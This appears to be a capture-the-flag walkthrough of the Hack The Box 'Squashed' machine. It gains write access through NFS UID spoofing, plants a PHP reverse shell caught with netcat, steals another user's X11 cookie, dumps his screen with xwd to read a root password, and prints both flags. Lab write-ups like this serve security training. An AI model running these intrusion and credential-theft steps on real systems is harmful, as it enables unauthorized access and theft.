![Squashed.PNG](/assets/Machines/Easy/Squashed/Squashed.png)

1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.191
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.191
```

**Output**
```bash
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
43463/tcp open  unknown
46301/tcp open  unknown
50059/tcp open  unknown
53411/tcp open  unknown
```


#### **NFS (Network File System)**
NFS is a server/client system enabling users to share files and directories across a network and allowing those shares to be mounted locally

3. Look shares hosted on target machine.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Squashed]
└─| showmount -e squashed.htb
Export list for squashed.htb:
/home/ross    *
/var/www/html *
```



4. Mount the directories
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Squashed]
└─| mount -t nfs squashed.htb:/var/www/html /mnt/1
```

---

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Squashed]
└─| mount -t nfs squashed.htb:/home/ross /mnt/2
```

5. Look the permissions of each directory
```bash
┌──(root㉿kali)-[/mnt]
└─| ls -ld 1 
drwxr-xr-- 5 2017 www-data 4096 Nov 11 19:15 1
```

---

```bash
┌──(root㉿kali)-[/mnt]
└─| ls -ld 2
drwxr-xr-x 14 1001 1001 4096 Nov 11 16:54 2
```

6. Now, we can try to add a false user with the same permission of `/mnt/1` (**2017**)


```bash
┌──(root㉿kali)-[/mnt]
└─| useradd xela
```

---

```bash
┌──(root㉿kali)-[/mnt]
└─| usermod -u 2017 xela
```

---

```bash
┌──(root㉿kali)-[/mnt]
└─| groupmod -g 2017 xela
```


7. Yup!, we can add files into **1 directory**, in this case add **reverse_shell.php**

8. Listen with nc

9. Make petition to **reverse_shell.php** into navigator.

![revshell.PNG](/assets/Machines/Easy/Squashed/revshell.PNG)


10. Now, we can obtain a reverse shell
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Squashed]
└─| nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.191] 58116
Linux squashed.htb 5.4.0-131-generic #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 00:29:00 up  2:35,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               21:54    2:35m 14.39s  0.05s /usr/libexec/gnome-session-binary --systemd --session=gnome
uid=2017(alex) gid=2017(alex) groups=2017(alex)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
alex
```

11. Spawn a `/bin/bash` 
```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
alex@squashed:/$ 

```

12. Cat a **user flag** in path `/home/alex`

```bash
alex@squashed:/home/alex$ cat user.txt
cat user.txt
b71517c79a0ccaf0e97230b0bf0f58c7
```


### **It's time to escalate privileges** 🐓
1. Create a false user with the same permission of `/mnt/2` (**1001**)

```bash
┌──(root㉿kali)-[/mnt]
└─| useradd ssor        
```                                                                                  

```bash
┌──(root㉿kali)-[/mnt]
└─| usermod -u 1001 ssor 
```  

```bash          
┌──(root㉿kali)-[/mnt]
└─| groupmod -g 1001 ssor 
```     
                                                                             
```bash   
┌──(root㉿kali)-[/mnt]
└─| su ssor
```

2. Search all files into **2 directory**
```bash
$ ls -la
```

**Output**
```bash
drwxr-xr-x 14 ssor ssor 4096 Nov 11 16:54 .
drwxr-xr-x  4 root root 4096 Nov 11 19:18 ..
lrwxrwxrwx  1 root root    9 Oct 20 09:24 .bash_history -> /dev/null
drwx------ 11 ssor ssor 4096 Oct 21 10:57 .cache
drwx------ 12 ssor ssor 4096 Oct 21 10:57 .config
drwxr-xr-x  2 ssor ssor 4096 Oct 21 10:57 Desktop
drwxr-xr-x  2 ssor ssor 4096 Oct 21 10:57 Documents
drwxr-xr-x  2 ssor ssor 4096 Oct 21 10:57 Downloads
drwx------  3 ssor ssor 4096 Oct 21 10:57 .gnupg
drwx------  3 ssor ssor 4096 Oct 21 10:57 .local
drwxr-xr-x  2 ssor ssor 4096 Oct 21 10:57 Music
drwxr-xr-x  2 ssor ssor 4096 Oct 21 10:57 Pictures
drwxr-xr-x  2 ssor ssor 4096 Oct 21 10:57 Public
drwxr-xr-x  2 ssor ssor 4096 Oct 21 10:57 Templates
drwxr-xr-x  2 ssor ssor 4096 Oct 21 10:57 Videos
lrwxrwxrwx  1 root root    9 Oct 21 09:07 .viminfo -> /dev/null
-rw-------  1 ssor ssor   57 Nov 11 16:54 .Xauthority
-rw-------  1 ssor ssor 2475 Nov 11 16:54 .xsession-errors
-rw-------  1 ssor ssor 2475 Oct 31 06:13 .xsession-errors.old
```


* Existence of file **.Xauthority** we tell exist any program for manager GUI with windows.

* **.Xauthority**: This file is used to store credentials into a cookie. When a session is then used to authenticate.

* The idea is stole this credentials with our user **ssor**



3. Read this credential in base64 to evitate errors
```bash
$ cat .Xauthority | base64
AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABB6mDSUNLTGqArocGpxSMYi
```

4. Put this credential decode into a directory `/tmp` on target machine.

```bash
alex@squashed:/home/alex$ echo "AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABB6mDSUNLTGqArocGpxSMYi" | base64 -d > /tmp/.Xauthority
```

5. Create a environment variable
```bash
alex@squashed:/tmp$ export XAUTHORITY=/tmp/.Xauthority
```

6. To stole the credential first should know what screen is using by **ross**

```bash
alex@squashed:/tmp$ w
w
 00:53:57 up  3:00,  1 user,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               21:54    3:00m 16.58s  0.05s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

* He is using `:0`


7. Use **xwd** to dump screen 
```bash
alex@squashed:/tmp$ xwd -root -screen -silent -display :0 > /tmp/screenross.xwd
```

8. Create a server in current directory and download **screenross.xwd** file in our machine.

```bash
alex@squashed:/tmp$ python3 -m http.server
```

---

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Squashed]
└─| wget http://squashed.htb:8000/screenross.xwd
```

9. Use **convert** to tranform data into **png** file
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Squashed]
└─| convert screenross.xwd screenross.png
```

10. Open the image

![creds.PNG](/assets/Machines/Easy/Squashed/creds.PNG)


11. Log with ssh
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Squashed]
└─| ssh root@squashed.htb
```

12. Cat the **root flag**s

```bash
root@squashed:~| cat root.txt 
504ad8cb4e3d2babaa19f29cfce0afa7
```